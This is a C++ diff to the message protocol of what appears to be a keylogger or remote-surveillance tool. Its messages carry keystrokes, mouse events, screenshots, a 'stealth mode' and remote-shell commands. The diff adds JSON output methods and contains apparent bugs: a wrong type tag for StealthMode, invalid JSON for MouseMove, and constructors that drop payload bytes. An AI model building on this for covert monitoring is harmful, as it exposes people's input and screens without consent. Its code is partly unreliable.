@@ -15,6 +15,7 @@
 #include <Utils/ILoggable.hpp>
 #include <net/MACAddress.hpp>
 #include <Protocol/MessagesEnums.hpp>
+#include <utils/StringHelpers.hpp>
 
 namespace spi::proto
 {
@@ -22,7 +23,7 @@ namespace spi::proto
 
     struct ReplyCode : public ILoggable
     {
-        uint32_t code;
+        ReplyType code;
 
         static constexpr const size_t SerializedSize = 4;
 
@@ -30,14 +31,14 @@ namespace spi::proto
 
         ReplyCode(const Buffer &buff)
         {
-            code = Serializer::unserializeInt(buff, 0);
+            code = static_cast<ReplyType::EnumType>(Serializer::unserializeInt(buff, 0));
         }
 
         void serialize(Buffer &out) const noexcept override
         {
             out.reserve(out.size() + SerializedSize);
 
-            Serializer::serializeInt(out, code);
+            Serializer::serializeInt(out, static_cast<uint32_t>(code));
         }
 
         void serializeTypeInfo(Buffer &out) const noexcept override
@@ -49,7 +50,15 @@ namespace spi::proto
 
         std::string stringify() const noexcept override
         {
-            return "[ReplyCode] " + std::to_string(code);
+            return "[ReplyCode] " + code.toString();
+        }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::ReplyCode)), ", ",
+                                         "\"code\": ", JSON::quote(code.toString()),
+                                         " }");
         }
     };
 
@@ -72,17 +81,26 @@ namespace spi::proto
         {
             return "[Bye]";
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::Bye)),
+                                         " }");
+        }
     };
 
     struct RawData : public ILoggable
     {
+        static constexpr const size_t SerializedSize = 4;
+
         std::vector<Byte> bytes;
 
         RawData() = default;
 
-        RawData(const Buffer &buff)
+        explicit RawData(const Buffer &buff)
         {
-            bytes = Serializer::unserializeBuff(buff, 0);
+            bytes.resize(Serializer::unserializeInt(buff, 0));
         }
 
         void serialize(Buffer &out) const noexcept override
@@ -103,6 +121,13 @@ namespace spi::proto
         std::string stringify() const noexcept override
         {
             return "[RawData] size: " + std::to_string(bytes.size());
+        }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::RawData)),
+                                         " }");
         }
     };
 
@@ -164,6 +189,13 @@ namespace spi::proto
             ss << "port: " << port;
             return ss.str();
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::Hello)),
+                                         " }");
+        }
     };
 
     struct KeyEvent : public ILoggable
@@ -208,6 +240,16 @@ namespace spi::proto
             ss << "code: " << code.toString() << ", ";
             ss << "state: " << state.toString();
             return ss.str();
+        }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::KeyEvent)), ", ",
+                                         "\"timestamp\": ", timestamp.time_since_epoch().count(), ", ",
+                                         "\"code\": ", JSON::quote(code.toString()), ", ",
+                                         "\"state\": ", JSON::quote(state.toString()),
+                                         " }");
         }
     };
 
@@ -262,6 +304,19 @@ namespace spi::proto
             ss << "button: " << button.toString();
             return ss.str();
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::MouseClick)),
+                                         ", ",
+                                         "\"timestamp\": ", timestamp.time_since_epoch().count(), ", ",
+                                         "\"x\": ", x, ", ",
+                                         "\"y\": ", y, ", ",
+                                         "\"state\": ", JSON::quote(state.toString()), ", ",
+                                         "\"button\": ", JSON::quote(button.toString()),
+                                         " }");
+        }
     };
 
     struct MouseMove : public ILoggable
@@ -307,17 +362,29 @@ namespace spi::proto
             ss << "y: " << y << ", ";
             return ss.str();
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::MouseMove)), ", ",
+                                         "\"timestamp\": ", timestamp.time_since_epoch().count(), ", ",
+                                         "\"x\": ", x, ", ",
+                                         "\"y\": ", y, ", ",
+                                         " }");
+        }
     };
 
     struct ImageData : public ILoggable
     {
+        static constexpr const size_t SerializedSize = 4;
+
         std::vector<Byte> bytes;
 
         ImageData() = default;
 
-        ImageData(const Buffer &buff)
+        explicit ImageData(const Buffer &buff)
         {
-            bytes = Serializer::unserializeBuff(buff, 0);
+            bytes.resize(Serializer::unserializeInt(buff, 0));
         }
 
         void serialize(Buffer &out) const noexcept override
@@ -337,6 +404,13 @@ namespace spi::proto
         std::string stringify() const noexcept override
         {
             return "[ImageData] size: " + std::to_string(bytes.size());
+        }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::ImageData)),
+                                         " }");
         }
     };
 
@@ -359,6 +433,13 @@ namespace spi::proto
         {
             return "[StealthMode] requested switch to stealth mode";
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::ImageData)),
+                                         " }");
+        }
     };
 
     struct ActiveMode : public ILoggable
@@ -379,6 +460,13 @@ namespace spi::proto
         std::string stringify() const noexcept override
         {
             return "[ActiveMode] requested switch to active mode";
+        }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::ActiveMode)),
+                                         " }");
         }
     };
 
@@ -401,6 +489,13 @@ namespace spi::proto
         {
             return "[Screenshot] requested screenshot";
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::Screenshot)),
+                                         " }");
+        }
     };
 
     struct RList : public ILoggable
@@ -422,13 +517,27 @@ namespace spi::proto
         {
             return "[RList] remote shell requested list of connected clients";
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::RList)),
+                                         " }");
+        }
     };
 
     struct RListReply : public ILoggable
     {
         std::vector<::net::MACAddress> connectedClients;
+        uint32_t nbClients{0};
 
         static constexpr const size_t SerializedSize = 4;
+
+        RListReply() noexcept = default;
+
+        RListReply(const Buffer &buff) : nbClients(Serializer::unserializeInt(buff, 0))
+        {
+        }
 
         void serialize(Buffer &out) const noexcept override
         {
@@ -450,6 +559,32 @@ namespace spi::proto
         std::string stringify() const noexcept override
         {
             return "[RList] replying with a list of clients";
+        }
+
+    private:
+        std::string __buildJSONArray() const noexcept
+        {
+            std::stringstream ss;
+
+            ss << "[ ";
+            std::for_each(connectedClients.begin(), connectedClients.end(), [this, &ss](const ::net::MACAddress &mac) {
+                if (mac != connectedClients.front()) {
+                    ss << ", ";
+                }
+                ss << "\"" << mac.toString() << "\"";
+            });
+            ss << " ]";
+            return ss.str();
+        }
+
+    public:
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::RListReply)),
+                                         ", ",
+                                         "\"clients\": ", __buildJSONArray(),
+                                         " }");
         }
     };
 
@@ -484,6 +619,13 @@ namespace spi::proto
         {
             return "[RStealthMode] remote shell requested switching to stealth mode";
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::RStealthMode)),
+                                         " }");
+        }
     };
 
     struct RActiveMode : public ILoggable
@@ -517,6 +659,13 @@ namespace spi::proto
         {
             return "[RActiveMode] remote shell requested switching to active mode";
         }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::RActiveMode)),
+                                         " }");
+        }
     };
 
     struct RScreenshot : public ILoggable
@@ -549,6 +698,13 @@ namespace spi::proto
         std::string stringify() const noexcept override
         {
             return "[RScreenshot] remote shell requested taking a screenshot";
+        }
+
+        std::string JSONify() const noexcept override
+        {
+            return utils::unpackToString("{ ",
+                                         "\"type\": ", JSON::quote(MessageType::toString(MessageType::RScreenshot)),
+                                         " }");
         }
     };
 }
